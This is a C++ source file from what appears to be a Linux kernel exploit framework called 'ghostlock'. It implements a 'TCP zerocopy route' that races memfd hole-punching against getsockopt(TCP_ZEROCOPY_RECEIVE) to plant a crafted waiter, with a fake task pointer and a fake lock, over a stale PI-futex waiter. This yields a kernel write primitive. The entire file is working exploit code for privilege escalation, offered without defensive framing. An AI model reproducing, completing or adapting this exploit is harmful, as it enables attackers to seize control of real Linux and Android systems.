#include "common.h"
#include <time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include "target.h"
#include "session/exploit_session.hpp"

#include "routes/select_stack_route.h"
#include "routes/tcp_zerocopy_route.h"

namespace ghostlock::route {

static const struct execution_settings *execution_settings(void) {
    return target_profile_execution(&g_target_profile);
}

/* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
 * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
 * waiter->lock. */
#define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)

/* Decoupling plan: stop and drain the shared PI consumer. Input: race context;
 * output: consumer idle. */
static void tcp_wait_for_consumer_idle(TcpZerocopyRouteContext *context) {
    atomic_store(&context->race->consumer_go, 0);
    while (atomic_load(&context->race->consumer_inflight)) {
        __asm__ volatile("yield":: : "memory");
    }
}

/* Decoupling plan: create a connected loopback TCP pair. Input: output slots;
 * output: 0/-1 and owned descriptors recorded in TcpZerocopyRouteContext. */
static int tcp_make_pair(TcpZerocopyRouteContext *context) {
    ghostlock::UniqueFd listener(socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0));
    if (!listener.valid()) {
        return -1;
    }
    int one = 1;
    setsockopt(listener.get(), SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = 0;

    if (bind(listener.get(), (struct sockaddr *) &addr, sizeof(addr)) != 0 ||
            listen(listener.get(), 1) != 0) {
        return -1;
    }

    socklen_t addr_len = sizeof(addr);
    if (getsockname(listener.get(), (struct sockaddr *) &addr, &addr_len) != 0) {
        return -1;
    }

    context->client_fd.reset(socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0));
    if (!context->client_fd.valid()) {
        return -1;
    }
    if (connect(context->client_fd.get(), (struct sockaddr *) &addr, sizeof(addr)) != 0) {
        context->client_fd.reset();
        return -1;
    }

    context->server_fd.reset(accept4(listener.get(), NULL, NULL, SOCK_CLOEXEC));
    if (!context->server_fd.valid()) {
        context->client_fd.reset();
        return -1;
    }
    return 0;
}

/* Repeatedly fill and punch the context-owned zerocopy backing memfd. Input:
 * TcpZerocopyRouteContext; output: context-owned phase/error flags. */
static void *tcp_punch_thread(void *arg) {
    ghostlock::support::disable_rseq_for_thread();
    auto *context = static_cast<TcpZerocopyRouteContext *>(arg);
    while (!atomic_load(&context->punch_go) &&
            !atomic_load(&context->punch_stop)) {
        sched_yield();
    }
    while (!atomic_load(&context->punch_stop)) {
        if (fallocate(context->punch_fd.get(), 0, 0, (off_t) context->mapping_length) != 0) {
            atomic_store(&context->punch_failed, errno ? errno : EIO);
            pr_warning("tcp punch fill errno=%d\n", errno);
            break;
        }
        atomic_store(&context->punch_phase, 1);
        if (fallocate(context->punch_fd.get(),
                FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                (off_t) context->page_size,
                (off_t) (context->mapping_length - context->page_size)) != 0) {
            /* without the hole the target page keeps stale contents and the
             * zerocopy write misses */
            atomic_store(&context->punch_failed, errno ? errno : EIO);
            pr_warning("tcp punch hole errno=%d\n", errno);
        }
        atomic_store(&context->punch_phase, 0);
        if (atomic_load(&context->punch_failed)) {
            break;
        }
    }
    return NULL;
}

/* Acquire every userspace resource owned by the TCP route. No PI consumer or
 * punch operation is armed until this function has completed successfully. */

}  // namespace ghostlock::route

int ghostlock::TcpZerocopyRoute::prepare() noexcept {
    if (!(g_heap_context.current.base) || !(g_heap_context.current.fake_lock) || !(g_heap_context.current.fake_fops)) {
        pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
                (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_fops));
        return fail(40, 0);
    }

    if (ghostlock::route::tcp_make_pair(this) != 0) {
        pr_warning("tcp route pair setup failed errno=%d\n", errno);
        return fail(41, errno);
    }

    page_size = (size_t) sysconf(_SC_PAGESIZE);
    punch_fd.reset(
            (int) syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC));
    if (!punch_fd.valid() ||
            fallocate(punch_fd.get(), 0, 0, (off_t) mapping_length) != 0) {
        pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
        return fail(42, errno);
    }
    void *mapped = mmap(NULL, mapping_length, PROT_READ | PROT_WRITE,
            MAP_SHARED, punch_fd.get(), 0);
    if (mapped == MAP_FAILED) {
        pr_warning("tcp route mmap errno=%d\n", errno);
        return fail(43, errno);
    }
    mapping = MappedRegion(mapped, mapping_length);
    unsigned char *bytes = static_cast<unsigned char *>(mapping.data());
    for (size_t off = 0; off < mapping_length; off += page_size) {
        bytes[off] = 0x55;
    }

    atomic_store(&race->consumer_stop, 0);
    atomic_store(&race->consumer_go, 0);
    atomic_store(&race->consumer_calls, 0);
    atomic_store(&race->consumer_success, 0);
    int thread_error = punch_worker.start(ghostlock::route::tcp_punch_thread, this);
    if (thread_error != 0) {
        pr_warning("tcp route punch thread errno=%d\n", thread_error);
        return fail(44, thread_error);
    }
    return 0;
}

/* Run the route after prepare has established exclusive resource ownership. */
RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
    /* waiter->task carries init_task's phys alias, not the image address */
    uintptr_t waiter_task = SLIDE_INIT_TASK;
    int arm_seq = (int) execution->tcp_arm_sequence;
    int post_hold =
            (int) execution->tcp_post_receive_hold_iterations;
    int attempts = (int) execution->tcp_attempts;

    pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
            "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
            (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_w0), (g_heap_context.current.fake_task), waiter_task,
            attempts, arm_seq, post_hold);

    atomic_store(&punch_go, 1);
    /* custom-write mode: fire the PI walk immediately */
    atomic_store(&race->route_delay_usec, 0);

    char sendbuf[64];
    memset(sendbuf, 0x33, sizeof(sendbuf));

    for (int i = 1; i <= attempts && !route_won; i++) {
        int calls_before = atomic_load(&race->consumer_calls);
        int success_before = atomic_load(&race->consumer_success);
        (void) send(server_fd.get(), sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
        while (atomic_load(&punch_phase)) {
            sched_yield();
        }
        for (int spin = 0;
             !atomic_load(&punch_phase) &&
                     !atomic_load(&punch_failed) &&
                     spin < 10000000;
             spin++) {
            __asm__ volatile("yield":: : "memory");
        }
        if (atomic_load(&punch_failed)) {
            (void) fail(46, atomic_load(&punch_failed));
            pr_warning("tcp route puncher failed errno=%d\n",
                    status.error_number);
            break;
        }

        unsigned char zc[0x40];
        memset(zc, 0, sizeof(zc));
        ghostlock::support::put64(zc, 0x18,
                (uint64_t)(uintptr_t)(static_cast<unsigned char *>(
                        mapping.data()) + page_size));
        ghostlock::support::put32(zc, 0x20, sizeof(sendbuf));
        ghostlock::support::put64(zc, 0x28, waiter_task);
        ghostlock::support::put64(zc, 0x30, (g_heap_context.current.fake_lock));

        socklen_t len = sizeof(zc);
        errno = 0;
        int ret = getsockopt(client_fd.get(), IPPROTO_TCP,
                TCP_ZEROCOPY_RECEIVE, zc,
                &len);
        int saved_errno = errno;
        /* release the consumer only once the zerocopy write landed in the
         * waiter frame; earlier release walks a half-written waiter */
        if (i >= arm_seq && ret == 0) {
            atomic_store(&race->consumer_go, i);
            for (int spin = 0; spin < post_hold; spin++) {
                __asm__ volatile("yield":: : "memory");
            }
            ghostlock::route::tcp_wait_for_consumer_idle(this);
        }

        int calls = atomic_load(&race->consumer_calls);
        int success = atomic_load(&race->consumer_success);
        if (calls <= calls_before || success <= success_before) {
            if ((i % 100) == 0 || ret != 0) {
                pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
                        "success=%d\n",
                        i, ret, saved_errno, len, calls, success);
            }
            continue;
        }
        /* consumer fired: the PI walk derefed the crafted waiter and wrote.
         * stages verify their own effects; no cfi stage here. */
        route_won = 1;
        status.code = ROUTE_OK;
        status.step = 0;
        status.error_number = 0;
    }
    if (!route_won && status.step == 0) {
        (void) fail(45, 0);
    }
    return status;
}

namespace ghostlock::route {


/* Public compatibility entry: lifecycle is now explicitly ordered while the
 * common route dispatcher remains scheduled for S14. */
RouteStatus do_tcp_fake_lock_route(const WriteRequest *request) {
    TcpZerocopyRouteContext context(
            &ghostlock::g_exploit_session.race, request, execution_settings(),
            TCP_PUNCH_SHMEM_LEN);  // NOLINT(bugprone-implicit-widening-of-multiplication-result)
    if (context.prepare() == 0) {
        (void) context.execute();
    }
    context.disarm();
    context.destroy();
    if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 47) {
        pr_warning("tcp route punch join errno=%d; resources retained\n",
                context.status.error_number);
    } else if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 48) {
        pr_warning("tcp route munmap errno=%d\n", context.status.error_number);
    }

    pr_info("tcp route done=%d calls=%d success=%d status=%d clean=%d/%d "
            "step=%d errno=%d\n",
            context.route_won,
            atomic_load(&context.race->consumer_calls),
            atomic_load(&context.race->consumer_success), context.status.code,
            context.status.userspace_clean, context.status.kernel_disarmed,
            context.status.step, context.status.error_number);
    return context.status;
}

}  // namespace ghostlock::route
